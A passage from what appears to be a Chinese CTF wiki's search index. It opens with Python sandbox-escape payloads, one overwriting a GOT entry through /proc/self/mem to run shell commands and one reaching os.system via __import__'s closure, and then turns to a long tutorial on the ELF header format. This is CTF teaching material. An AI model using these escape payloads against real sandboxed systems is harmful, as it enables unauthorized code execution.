            "text": "( lambda   r , w : r . seek ( 0x08de2b8 )   or   w . seek ( 0x08de8c8 )   or   w . write ( r . read ( 8 ))   or   () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( l + s /home/ctf/ ))(() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( /proc/self/mem , r ),() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( /proc/self/mem ,   w ,   0 ))  ( lambda   r , w : r . seek ( 0x08de2b8 )   or   w . seek ( 0x08de8c8 )   or   w . write ( r . read ( 8 ))   or   () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( c + at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb ))(() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( /proc/self/mem , r ),() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( /proc/self/mem ,   w ,   0 ))", 
            "title": "\u52ab\u6301 got \u8868 getshell"
        }, 
        {
            "location": "/pwn/sandbox/python-sandbox-escape/#import", 
            "text": "\u5728\u4e0d\u65ad\u7684 dir \u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0  closure   \u8fd9\u4e2a object \u4fdd\u5b58\u4e86\u53c2\u6570\uff0c\u53ef\u4ee5\u5f15\u7528\u539f\u751f\u7684  import  print   __import__ . __getattribute__ ( __clo + sure__ )[ 0 ] . cell_contents ( o + s ) . __getattribute__ ( sy + stem )( l + s home )", 
            "title": "\u5bfb\u627e import \u7684\u95f4\u63a5\u5f15\u7528"
        }, 
        {
            "location": "/pwn/sandbox/python-sandbox-escape/#_5", 
            "text": "https://xz.aliyun.com/t/52#toc-10   https://blog.csdn.net/qq_35078631/article/details/78504415   https://www.anquanke.com/post/id/85571   http://bestwing.me/2018/05/03/awesome-python-sandbox-in-ciscn/#0x01", 
            "title": "\u53c2\u8003"
        }, 
        {
            "location": "/executable/elf/elf_structure/", 
            "text": "ELF \u6587\u4ef6\n\n\n\n\n\u672c\u90e8\u5206\u5185\u5bb9\u6765\u6e90\u4e8e ELF 1.2 \u6807\u51c6\uff0c\u5185\u5bb9\u7ecf\u8fc7\u4e00\u5b9a\u7684\u4fee\u6539\u4e0e\u6574\u7406\uff0c\u4e3b\u8981\u53c2\u8003\u6587\u732e\u5982\u4e0b\n\n\n\n\nELF \u6587\u4ef6\u683c\u5f0f\u5206\u6790\uff0c\u5317\u4eac\u5927\u5b66\uff0c\u6ed5\u542f\u660e\n\n\nELF-\u6467\u6bc1\u5723\u8bde\n\n\n\n\n\n\n\u7b80\u4ecb\n\n\nELF \uff08Executable and Linkable Format\uff09\u6587\u4ef6\uff0c\u4e5f\u5c31\u662f\u5728 Linux \u4e2d\u7684\u76ee\u6807\u6587\u4ef6\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e09\u79cd\u7c7b\u578b\n\n\n\n\n\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\uff08Relocatable File\uff09\uff0c\u5305\u542b\u7531\u7f16\u8bd1\u5668\u751f\u6210\u7684\u4ee3\u7801\u4ee5\u53ca\u6570\u636e\u3002\u94fe\u63a5\u5668\u4f1a\u5c06\u5b83\u4e0e\u5176\u5b83\u76ee\u6807\u6587\u4ef6\u94fe\u63a5\u8d77\u6765\u4ece\u800c\u521b\u5efa\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u3002\u5728 Linux \u7cfb\u7edf\u4e2d\uff0c\u8fd9\u79cd\u6587\u4ef6\u7684\u540e\u7f00\u4e00\u822c\u4e3a \n.o\n \u3002\n\n\n\n\n\u53ef\u6267\u884c\u6587\u4ef6\uff08Executable File\uff09\uff0c\u5c31\u662f\u6211\u4eec\u901a\u5e38\u5728 Linux \u4e2d\u6267\u884c\u7684\u7a0b\u5e8f\u3002\n\n\n\n\n\n\n\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff08Shared Object File\uff09\uff0c\u5305\u542b\u4ee3\u7801\u548c\u6570\u636e\uff0c\u8fd9\u79cd\u6587\u4ef6\u662f\u6211\u4eec\u6240\u79f0\u7684\u5e93\u6587\u4ef6\uff0c\u4e00\u822c\u4ee5 \n.so\n \u7ed3\u5c3e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u5b83\u6709\u4ee5\u4e0b\u4e24\u79cd\u4f7f\u7528\u60c5\u666f\n\n\n\n\n\u94fe\u63a5\u5668\uff08Link eDitor, ld\uff09\u53ef\u80fd\u4f1a\u5904\u7406\u5b83\u548c\u5176\u5b83\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff0c\u751f\u6210\u53e6\u5916\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u3002\n\n\n\u52a8\u6001\u94fe\u63a5\u5668\uff08Dynamic Linker\uff09\u5c06\u5b83\u4e0e\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5176\u5b83\u5171\u4eab\u76ee\u6807\u7ec4\u5408\u5728\u4e00\u8d77\u751f\u6210\u8fdb\u7a0b\u955c\u50cf\u3002\n\n\n\n\n\n\n\u5173\u4e8eLink eDitor\u7684\u547d\u540d\uff0c\nhttps://en.wikipedia.org/wiki/GNU_linker\n\n\n\n\n\u76ee\u6807\u6587\u4ef6\u7531\u6c47\u7f16\u5668\u548c\u94fe\u63a5\u5668\u521b\u5efa\uff0c\u662f\u6587\u672c\u7a0b\u5e8f\u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u5904\u7406\u5668\u4e0a\u8fd0\u884c\u3002\u90a3\u4e9b\u9700\u8981\u865a\u62df\u673a\u624d\u80fd\u591f\u6267\u884c\u7684\u7a0b\u5e8f(Java)\u4e0d\u5c5e\u4e8e\u8fd9\u4e00\u8303\u56f4\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u4e8e ELF \u7684\u6587\u4ef6\u683c\u5f0f\u3002\n\n\n\u6587\u4ef6\u683c\u5f0f\n\n\n\u76ee\u6807\u6587\u4ef6\u65e2\u4f1a\u53c2\u4e0e\u7a0b\u5e8f\u94fe\u63a5\u53c8\u4f1a\u53c2\u4e0e\u7a0b\u5e8f\u6267\u884c\u3002\u51fa\u4e8e\u65b9\u4fbf\u6027\u548c\u6548\u7387\u8003\u8651\uff0c\u6839\u636e\u8fc7\u7a0b\u7684\u4e0d\u540c\uff0c\u76ee\u6807\u6587\u4ef6\u683c\u5f0f\u63d0\u4f9b\u4e86\u5176\u5185\u5bb9\u7684\u4e24\u79cd\u5e76\u884c\u89c6\u56fe\uff0c\u5982\u4e0b\n\n\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u6765\n\u5173\u6ce8\u4e00\u4e0b\u94fe\u63a5\u89c6\u56fe\n\u3002\n\n\n\u6587\u4ef6\u5f00\u59cb\u5904\u662f ELF \u5934\u90e8\uff08 \nELF  Header\n\uff09\uff0c\u5b83\u7ed9\u51fa\u4e86\u6574\u4e2a\u6587\u4ef6\u7684\u7ec4\u7ec7\u60c5\u51b5\u3002\n\n\n\u5982\u679c\u7a0b\u5e8f\u5934\u90e8\u8868\uff08Program Header Table\uff09\u5b58\u5728\u7684\u8bdd\uff0c\u5b83\u4f1a\u544a\u8bc9\u7cfb\u7edf\u5982\u4f55\u521b\u5efa\u8fdb\u7a0b\u3002\u7528\u4e8e\u751f\u6210\u8fdb\u7a0b\u7684\u76ee\u6807\u6587\u4ef6\u5fc5\u987b\u5177\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u4f46\u662f\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4e0d\u9700\u8981\u8fd9\u4e2a\u8868\u3002\n\n\n\u8282\u533a\u90e8\u5206\u5305\u542b\u5728\u94fe\u63a5\u89c6\u56fe\u4e2d\u8981\u4f7f\u7528\u7684\u5927\u90e8\u5206\u4fe1\u606f\uff1a\u6307\u4ee4\u3001\u6570\u636e\u3001\u7b26\u53f7\u8868\u3001\u91cd\u5b9a\u4f4d\u4fe1\u606f\u7b49\u7b49\u3002\n\n\n\u8282\u533a\u5934\u90e8\u8868\uff08Section Header Table\uff09\u5305\u542b\u4e86\u63cf\u8ff0\u6587\u4ef6\u8282\u533a\u7684\u4fe1\u606f\uff0c\u6bcf\u4e2a\u8282\u533a\u5728\u8868\u4e2d\u90fd\u6709\u4e00\u4e2a\u8868\u9879\uff0c\u4f1a\u7ed9\u51fa\u8282\u533a\u540d\u79f0\u3001\u8282\u533a\u5927\u5c0f\u7b49\u4fe1\u606f\u3002\u7528\u4e8e\u94fe\u63a5\u7684\u76ee\u6807\u6587\u4ef6\u5fc5\u987b\u6709\u8282\u533a\u5934\u90e8\u8868\uff0c\u5176\u5b83\u76ee\u6807\u6587\u4ef6\u5219\u65e0\u6240\u8c13\uff0c\u53ef\u4ee5\u6709\uff0c\u4e5f\u53ef\u4ee5\u6ca1\u6709\u3002\n\n\n\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u5173\u4e8e\u94fe\u63a5\u89c6\u56fe\u6bd4\u8f83\u5f62\u8c61\u7684\u5c55\u793a\n\n\n\n\n\u5bf9\u4e8e\n\u6267\u884c\u89c6\u56fe\n\u6765\u8bf4\uff0c\u5176\u4e3b\u8981\u7684\u4e0d\u540c\u70b9\u5728\u4e8e\u6ca1\u6709\u4e86section\uff0c\u800c\u6709\u4e86\u591a\u4e2asegment\u3002\u5176\u5b9e\u8fd9\u91cc\u7684 segment \u5927\u90fd\u662f\u6765\u6e90\u4e8e\u94fe\u63a5\u89c6\u56fe\u4e2d\u7684 section\u3002\n\n\n\u6ce8\u610f:\n\n\n\n\n\u5c3d\u7ba1\u56fe\u4e2d\u662f\u6309\u7167 ELF \u5934\uff0c\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u8282\u533a\uff0c\u8282\u533a\u5934\u90e8\u8868\u7684\u987a\u5e8f\u6392\u5217\u7684\u3002\u4f46\u5b9e\u9645\u4e0a\u9664\u4e86 ELF  \u5934\u90e8\u8868\u4ee5\u5916\uff0c\u5176\u5b83\u90e8\u5206\u90fd\u6ca1\u6709\u4e25\u683c\u7684\u7684\u987a\u5e8f\u3002\n\n\n\n\n\u6570\u636e\u5f62\u5f0f\n\n\nELF \u6587\u4ef6\u683c\u5f0f\u652f\u6301 8 \u4f4d/32 \u4f4d\u4f53\u7cfb\u7ed3\u6784\u3002\u5f53\u7136\uff0c\u8fd9\u79cd\u683c\u5f0f\u662f\u53ef\u4ee5\u6269\u5c55\u7684\uff0c\u4e5f\u53ef\u4ee5\u652f\u6301\u66f4\u5c0f\u7684\u6216\u8005\u66f4\u5927\u4f4d\u6570\u7684\u5904\u7406\u5668\u67b6\u6784\u3002\u56e0\u6b64\uff0c\u76ee\u6807\u6587\u4ef6\u4f1a\u5305\u542b\u4e00\u4e9b\u63a7\u5236\u6570\u636e\uff0c\u8fd9\u90e8\u5206\u6570\u636e\u8868\u660e\u4e86\u76ee\u6807\u6587\u4ef6\u6240\u4f7f\u7528\u7684\u67b6\u6784\uff0c\u8fd9\u4e5f\u4f7f\u5f97\u5b83\u53ef\u4ee5\u88ab\u901a\u7528\u7684\u65b9\u5f0f\u6765\u8bc6\u522b\u548c\u89e3\u91ca\u3002\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u5176\u5b83\u6570\u636e\u91c7\u7528\u76ee\u7684\u5904\u7406\u5668\u7684\u683c\u5f0f\u8fdb\u884c\u7f16\u7801\uff0c\u4e0e\u5728\u4f55\u79cd\u673a\u5668\u4e0a\u521b\u5efa\u6ca1\u6709\u5173\u7cfb\u3002\u8fd9\u91cc\u5176\u5b9e\u60f3\u8868\u660e\u7684\u610f\u601d\u76ee\u6807\u6587\u4ef6\u53ef\u4ee5\u8fdb\u884c\u4ea4\u53c9\u7f16\u8bd1\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 x86 \u5e73\u53f0\u751f\u6210 arm \u5e73\u53f0\u7684\u53ef\u6267\u884c\u4ee3\u7801\u3002\n\n\n\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u6570\u636e\u7ed3\u6784\u90fd\u9075\u4ece\u201c\u81ea\u7136\u201d\u5927\u5c0f\u548c\u5bf9\u9f50\u89c4\u5219\u3002\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u957f\u5ea6\n\n\n\u5bf9\u9f50\u65b9\u5f0f\n\n\n\u7528\u9014\n\n\n\n\n\n\n\n\n\n\nElf32_Addr\n\n\n4\n\n\n4\n\n\n\u65e0\u7b26\u53f7\u7a0b\u5e8f\u5730\u5740\n\n\n\n\n\n\nElf32_Half\n\n\n2\n\n\n2\n\n\n\u65e0\u7b26\u53f7\u534a\u6574\u578b\n\n\n\n\n\n\nElf32_Off\n\n\n4\n\n\n4\n\n\n\u65e0\u7b26\u53f7\u6587\u4ef6\u504f\u79fb\n\n\n\n\n\n\nElf32_Sword\n\n\n4\n\n\n4\n\n\n\u6709\u7b26\u53f7\u5927\u6574\u578b\n\n\n\n\n\n\nElf32_Word\n\n\n4\n\n\n4\n\n\n\u65e0\u7b26\u53f7\u5927\u6574\u578b\n\n\n\n\n\n\nunsigned char\n\n\n1\n\n\n1\n\n\n\u65e0\u7b26\u53f7\u5c0f\u6574\u578b\n\n\n\n\n\n\n\n\n\u5982\u679c\u5fc5\u8981\uff0c\u6570\u636e\u7ed3\u6784\u53ef\u4ee5\u5305\u542b\u663e\u5f0f\u5730\u8865\u9f50\u6765\u786e\u4fdd 4 \u5b57\u8282\u5bf9\u8c61\u6309 4 \u5b57\u8282\u5bf9\u9f50\uff0c\u5f3a\u5236\u6570\u636e\u7ed3\u6784\u7684\u5927\u5c0f\u662f 4 \u7684\u6574\u6570\u500d\u7b49\u7b49\u3002\u6570\u636e\u540c\u6837\u9002\u7528\u662f\u5bf9\u9f50\u7684\u3002\u56e0\u6b64\uff0c\u5305\u542b\u4e00\u4e2a Elf32_Addr \u7c7b\u578b\u6210\u5458\u7684\u7ed3\u6784\u4f53\u4f1a\u5728\u6587\u4ef6\u4e2d\u7684 4 \u5b57\u8282\u8fb9\u754c\u5904\u5bf9\u9f50\u3002\n\n\n\u4e3a\u4e86\u5177\u6709\u53ef\u79fb\u690d\u6027\uff0cELF \u6587\u4ef6\u4e0d\u4f7f\u7528\u4f4d\u57df\u3002\n\n\n\u5b57\u7b26\u8868\u793a\n\n\n\u5f85\u3002\n\n\n\u6ce8\uff1a\u5728\u4e0b\u9762\u7684\u4ecb\u7ecd\u4e2d\uff0c\u6211\u4eec\u4ee5 32 \u4f4d\u4e3a\u4e3b\u8fdb\u884c\u4ecb\u7ecd\u3002\n\n\nELF Header\n\n\nELF Header \u63cf\u8ff0\u4e86 ELF \u6587\u4ef6\u7684\u6982\u8981\u4fe1\u606f\uff0c\u5229\u7528\u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\u53ef\u4ee5\u7d22\u5f15\u5230 ELF \u6587\u4ef6\u7684\u5168\u90e8\u4fe1\u606f\uff0c\u6570\u636e\u7ed3\u6784\u5982\u4e0b\uff1a\n\n\n#define EI_NIDENT   16\n\n\n\ntypedef\n \nstruct\n \n{\n\n    \nunsigned\n \nchar\n   \ne_ident\n[\nEI_NIDENT\n];\n\n    \nELF32_Half\n      \ne_type\n;\n\n    \nELF32_Half\n      \ne_machine\n;\n\n    \nELF32_Word\n      \ne_version\n;\n\n    \nELF32_Addr\n      \ne_entry\n;\n\n    \nELF32_Off\n       \ne_phoff\n;\n\n    \nELF32_Off\n       \ne_shoff\n;\n\n    \nELF32_Word\n      \ne_flags\n;\n\n    \nELF32_Half\n      \ne_ehsize\n;\n\n    \nELF32_Half\n      \ne_phentsize\n;\n\n    \nELF32_Half\n      \ne_phnum\n;\n\n    \nELF32_Half\n      \ne_shentsize\n;\n\n    \nELF32_Half\n      \ne_shnum\n;\n\n    \nELF32_Half\n      \ne_shstrndx\n;\n\n\n}\n \nElf32_Ehdr\n;\n\n\n\n\n\n\u5176\u4e2d\u6bcf\u4e2a\u6210\u5458\u90fd\u662f e \u5f00\u5934\u7684\uff0c\u5b83\u4eec\u5e94\u8be5\u90fd\u662f ELF \u7684\u7f29\u5199\u3002\u6bcf\u4e2a\u6210\u5458\u5177\u4f53\u7684\u8bf4\u660e\u5982\u4e0b\u3002\n\n\ne_ident\n\n\n\u6b63\u5982\u4e4b\u524d\u6240\u8bf4\uff0cELF \u63d0\u4f9b\u4e86\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u6846\u67b6\uff0c\u4ee5\u4fbf\u4e8e\u652f\u6301\u591a\u79cd\u5904\u7406\u5668\uff0c\u591a\u79cd\u7f16\u7801\u683c\u5f0f\u7684\u673a\u5668\u3002\u8be5\u53d8\u91cf\u7ed9\u51fa\u4e86\u7528\u4e8e\u89e3\u7801\u548c\u89e3\u91ca\u6587\u4ef6\u4e2d\u4e0e\u673a\u5668\u65e0\u5173\u7684\u6570\u636e\u7684\u65b9\u5f0f\u3002\u8fd9\u4e2a\u6570\u7ec4\u5bf9\u4e8e\u4e0d\u540c\u7684\u4e0b\u6807\u7684\u542b\u4e49\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u5b8f\u540d\u79f0\n\n\n\u4e0b\u6807\n\n\n\u76ee\u7684\n\n\n\n\n\n\n\n\n\n\nEI_MAG0\n\n\n0\n\n\n\u6587\u4ef6\u6807\u8bc6\n\n\n\n\n\n\nEI_MAG1\n\n\n1\n\n\n\u6587\u4ef6\u6807\u8bc6\n\n\n\n\n\n\nEI_MAG2\n\n\n2\n\n\n\u6587\u4ef6\u6807\u8bc6\n\n\n\n\n\n\nEI_MAG3\n\n\n3\n\n\n\u6587\u4ef6\u6807\u8bc6\n\n\n\n\n\n\nEI_CLASS\n\n\n4\n\n\n\u6587\u4ef6\u7c7b\n\n\n\n\n\n\nEI_DATA\n\n\n5\n\n\n\u6570\u636e\u7f16\u7801\n\n\n\n\n\n\nEI_VERSION\n\n\n6\n\n\n\u6587\u4ef6\u7248\u672c\n\n\n\n\n\n\nEI_PAD\n\n\n7\n\n\n\u8865\u9f50\u5b57\u8282\u5f00\u59cb\u5904\n\n\n\n\n\n\n\n\n\u5176\u4e2d\uff0c\n\n\ne_ident[EI_MAG0]\n  \u5230 \ne_ident[EI_MAG3]\n\uff0c\u5373\u6587\u4ef6\u7684\u59344\u4e2a\u5b57\u8282\uff0c\u88ab\u79f0\u4f5c\u201c\u9b54\u6570\u201d\uff0c\u6807\u8bc6\u8be5\u6587\u4ef6\u662f\u4e00\u4e2aELF\u76ee\u6807\u6587\u4ef6\u3002\n\u81f3\u4e8e\u5f00\u5934\u4e3a\u4ec0\u4e48\u662f0x7f\uff0c\u5e76\u6ca1\u6709\u4ed4\u7ec6\u53bb\u67e5\u8fc7\n\u3002\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u503c\n\n\n\u4f4d\u7f6e\n\n\n\n\n\n\n\n\n\n\nELFMAG0\n\n\n0x7f\n\n\ne_ident[EI_MAG0]\n\n\n\n\n\n\nELFMAG1\n\n\n\u2018E\u2019\n\n\ne_ident[EI_MAG1]\n\n\n\n\n\n\nELFMAG2\n\n\n\u2018L\u2019\n\n\ne_ident[EI_MAG2]\n\n\n\n\n\n\nELFMAG3\n\n\n\u2018F\u2019\n\n\ne_ident[EI_MAG3]\n\n\n\n\n\n\n\n\ne_ident[EI_CLASS]\n \u4e3a \ne_ident[EI_MAG3]\n\u7684\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u6807\u8bc6\u6587\u4ef6\u7684\u7c7b\u578b\u6216\u5bb9\u91cf\u3002\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u503c\n\n\n\u610f\u4e49\n\n\n\n\n\n\n\n\n\n\nELFCLASSNONE\n\n\n0\n\n\n\u65e0\u6548\u7c7b\u578b\n\n\n\n\n\n\nELFCLASS32\n\n\n1\n\n\n32\u4f4d\u6587\u4ef6\n\n\n\n\n\n\nELFCLASS64\n\n\n2\n\n\n64\u4f4d\u6587\u4ef6\n\n\n\n\n\n\n\n\nELF \u6587\u4ef6\u7684\u8bbe\u8ba1\u4f7f\u5f97\u5b83\u53ef\u4ee5\u5728\u591a\u79cd\u5b57\u8282\u957f\u5ea6\u7684\u673a\u5668\u4e4b\u95f4\u79fb\u690d\uff0c\u800c\u4e0d\u9700\u8981\u5f3a\u5236\u89c4\u5b9a\u673a\u5668\u7684\u6700\u957f\u5b57\u8282\u957f\u5ea6\u548c\u6700\u77ed\u5b57\u8282\u957f\u5ea6\u3002\nELFCLASS32\n\u7c7b\u578b\u652f\u6301\u6587\u4ef6\u5927\u5c0f\u548c\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e0a\u9650\u4e3a 4GB \u7684\u673a\u5668\uff1b\u5b83\u4f7f\u7528\u4e0a\u8ff0\u5b9a\u4e49\u4e2d\u7684\u57fa\u672c\u7c7b\u578b\u3002\n\n\nELFCLASS64\n \u7c7b\u578b\u7528\u4e8e 64 \u4f4d\u67b6\u6784\u3002\n\n\ne_ident[EI_DATA]\n\u5b57\u8282\u7ed9\u51fa\u4e86\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u7279\u5b9a\u5904\u7406\u5668\u6570\u636e\u7684\u7f16\u7801\u65b9\u5f0f\u3002\u4e0b\u9762\u662f\u76ee\u524d\u5df2\u5b9a\u4e49\u7684\u7f16\u7801\uff1a\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u503c\n\n\n\u610f\u4e49\n\n\n\n\n\n\n\n\n\n\nELFDATANONE\n\n\n0\n\n\n\u65e0\u6548\u6570\u636e\u7f16\u7801\n\n\n\n\n\n\nELFDATA2LSB\n\n\n1\n\n\n\u5c0f\u7aef\n\n\n\n\n\n\nELFDATA2MSB\n\n\n2\n\n\n\u5927\u7aef\n\n\n\n\n\n\n\n\n\u5176\u5b83\u503c\u88ab\u4fdd\u7559\uff0c\u5728\u672a\u6765\u5fc5\u8981\u65f6\u5c06\u88ab\u8d4b\u4e88\u65b0\u7684\u7f16\u7801\u3002\n\n\n\u6587\u4ef6\u6570\u636e\u7f16\u7801\u65b9\u5f0f\u8868\u660e\u4e86\u6587\u4ef6\u5185\u5bb9\u7684\u89e3\u6790\u65b9\u5f0f\u3002\u6b63\u5982\u4e4b\u524d\u6240\u8ff0\uff0c\nELFCLASS32\n\u7c7b\u578b\u6587\u4ef6\u4f7f\u7528\u4e86\u5177\u67091\uff0c2 \u548c 4 \u5b57\u8282\u7684\u53d8\u91cf\u7c7b\u578b\u3002\u5bf9\u4e8e\u5df2\u5b9a\u4e49\u7684\u4e0d\u540c\u7684\u7f16\u7801\u65b9\u5f0f\uff0c\u5176\u8868\u793a\u5982\u4e0b\u6240\u793a\uff0c\u5176\u4e2d\u5b57\u8282\u53f7\u5728\u5de6\u4e0a\u89d2\u3002\n\n\nELFDATA2LSB\n\u7f16\u7801\u4f7f\u7528\u8865\u7801\uff0c\u6700\u4f4e\u6709\u6548\u4f4d\uff08Least Significant Byte\uff09\u5360\u7528\u6700\u4f4e\u5730\u5740\u3002\n\n\n\n\nELFDATA2MSB\n\u7f16\u7801\u4f7f\u7528\u8865\u7801\uff0c\u6700\u9ad8\u6709\u6548\u4f4d\uff08Most Significant Byte\uff09\u5360\u7528\u6700\u4f4e\u5730\u5740\u3002\n\n\n\n\ne_ident[EI_DATA]\n \u7ed9\u51fa\u4e86 ELF \u5934\u7684\u7248\u672c\u53f7\u3002\u76ee\u524d\u8fd9\u4e2a\u503c\u5fc5\u987b\u662f\nEV_CURRENT\n\uff0c\u5373\u4e4b\u524d\u5df2\u7ecf\u7ed9\u51fa\u7684\ne_version\n\u3002\n\n\ne_ident[EI_PAD]\n \u7ed9\u51fa\u4e86 \ne_ident\n \u4e2d\u672a\u4f7f\u7528\u5b57\u8282\u7684\u5f00\u59cb\u5730\u5740\u3002\u8fd9\u4e9b\u5b57\u8282\u88ab\u4fdd\u7559\u5e76\u7f6e\u4e3a0\uff1b\u5904\u7406\u76ee\u6807\u6587\u4ef6\u7684\u7a0b\u5e8f\u5e94\u8be5\u5ffd\u7565\u5b83\u4eec\u3002\u5982\u679c\u4e4b\u540e\u8fd9\u4e9b\u5b57\u8282\u88ab\u4f7f\u7528\uff0cEI_PAD\u7684\u503c\u5c31\u4f1a\u6539\u53d8\u3002\n\n\ne_type\n\n\ne_type\n \u6807\u8bc6\u76ee\u6807\u6587\u4ef6\u7c7b\u578b\u3002\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u503c\n\n\n\u610f\u4e49\n\n\n\n\n\n\n\n\n\n\nET_NONE\n\n\n0\n\n\n\u65e0\u6587\u4ef6\u7c7b\u578b\n\n\n\n\n\n\nET_REL\n\n\n1\n\n\n\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\n\n\n\n\n\n\nET_EXEC\n\n\n2\n\n\n\u53ef\u6267\u884c\u6587\u4ef6\n\n\n\n\n\n\nET_DYN\n\n\n3\n\n\n\u5171\u4eab\u76ee\u6807\u6587\u4ef6\n\n\n\n\n\n\nET_CORE\n\n\n4\n\n\n\u6838\u5fc3\u8f6c\u50a8\u6587\u4ef6\n\n\n\n\n\n\nET_LOPROC\n\n\n0xff00\n\n\n\u5904\u7406\u5668\u6307\u5b9a\u4e0b\u9650\n\n\n\n\n\n\nET_HIPROC\n\n\n0xffff\n\n\n\u5904\u7406\u5668\u6307\u5b9a\u4e0a\u9650\n\n\n\n\n\n\n\n\n\u867d\u7136\u6838\u5fc3\u8f6c\u50a8\u6587\u4ef6\u7684\u5185\u5bb9\u6ca1\u6709\u88ab\u8be6\u7ec6\u8bf4\u660e\uff0c\u4f46 \nET_CORE\n \u8fd8\u662f\u88ab\u4fdd\u7559\u7528\u4e8e\u6807\u5fd7\u6b64\u7c7b\u6587\u4ef6\u3002\u4ece \nET_LOPROC\n \u5230 \nET_HIPROC\n (\u5305\u62ec\u8fb9\u754c)\u88ab\u4fdd\u7559\u7528\u4e8e\u5904\u7406\u5668\u6307\u5b9a\u7684\u573a\u666f\u3002\u5176\u5b83\u503c\u5728\u672a\u6765\u5fc5\u8981\u65f6\u53ef\u88ab\u8d4b\u4e88\u65b0\u7684\u76ee\u6807\u6587\u4ef6\u7c7b\u578b\u3002\n\n\ne_machine\n\n\n\u8fd9\u4e00\u9879\u6307\u5b9a\u4e86\u5f53\u524d\u6587\u4ef6\u53ef\u4ee5\u8fd0\u884c\u7684\u673a\u5668\u67b6\u6784\u3002\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u503c\n\n\n\u610f\u4e49\n\n\n\n\n\n\n\n\n\n\nEM_NONE\n\n\n0\n\n\n\u65e0\u673a\u5668\u7c7b\u578b\n\n\n\n\n\n\nEM_M32\n\n\n1\n\n\nAT\nT WE 32100\n\n\n\n\n\n\nEM_SPARC\n\n\n2\n\n\nSPARC\n\n\n\n\n\n\nEM_386\n\n\n3\n\n\nIntel 80386\n\n\n\n\n\n\nEM_68K\n\n\n4\n\n\nMotorola 68000\n\n\n\n\n\n\nEM_88K\n\n\n5\n\n\nMotorola 88000\n\n\n\n\n\n\nEM_860\n\n\n7\n\n\nIntel 80860\n\n\n\n\n\n\nEM_MIPS\n\n\n8\n\n\nMIPS RS3000\n\n\n\n\n\n\n\n\n\u5176\u4e2d EM \u5e94\u8be5\u662f \nELF Machine\n \u7684\u7b80\u5199\u3002\n\n\n\u5176\u5b83\u503c\u88ab\u5728\u672a\u6765\u5fc5\u8981\u65f6\u7528\u4e8e\u65b0\u7684\u673a\u5668\u3002 \u6b64\u5916\uff0c\u7279\u5b9a\u5904\u7406\u5668\u7684ELF\u540d\u79f0\u4f7f\u7528\u673a\u5668\u540d\u79f0\u6765\u8fdb\u884c\u533a\u5206\uff0c\u4e00\u822c\u6807\u5fd7\u4f1a\u6709\u4e2a\u524d\u7f00\nEF_\n \uff08ELF Flag\uff09\u3002\u4f8b\u5982\uff0c\u5728\nEM_XYZ\n\u673a\u5668\u4e0a\u540d\u53eb \nWIDGET\n \u7684\u6807\u5fd7\u5c06\u88ab\u79f0\u4e3a \nEF_XYZ_WIDGET\n\u3002\n\n\ne_version\n\n\n\u6807\u8bc6\u76ee\u6807\u6587\u4ef6\u7684\u7248\u672c\u3002\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u503c\n\n\n\u610f\u4e49\n\n\n\n\n\n\n\n\n\n\nEV_NONE\n\n\n0\n\n\n\u65e0\u6548\u7248\u672c\n\n\n\n\n\n\nEV_CURRENT\n\n\n1\n\n\n\u5f53\u524d\u7248\u672c\n\n\n\n\n\n\n\n\n1 \u8868\u793a\u521d\u59cb\u6587\u4ef6\u683c\u5f0f\uff1b\u672a\u6765\u6269\u5c55\u65b0\u7684\u7248\u672c\u7684\u65f6\u5019(extensions)\u5c06\u4f7f\u7528\u66f4\u5927\u7684\u6570\u5b57\u3002\u867d\u7136\u5728\u4e0a\u9762\u503c\nEV_CURRENT\n\u4e3a1\uff0c\u4f46\u662f\u4e3a\u4e86\u53cd\u6620\u5f53\u524d\u7248\u672c\u53f7\uff0c\u5b83\u53ef\u80fd\u4f1a\u6539\u53d8\uff0c\n\u6bd4\u5982ELF\u5230\u73b0\u5728\u4e5f\u5c31\u662f1.2\u7248\u672c\u3002\n\n\ne_entry\n\n\n\u8fd9\u4e00\u9879\u4e3a\u7cfb\u7edf\u8f6c\u4ea4\u63a7\u5236\u6743\u7ed9 ELF 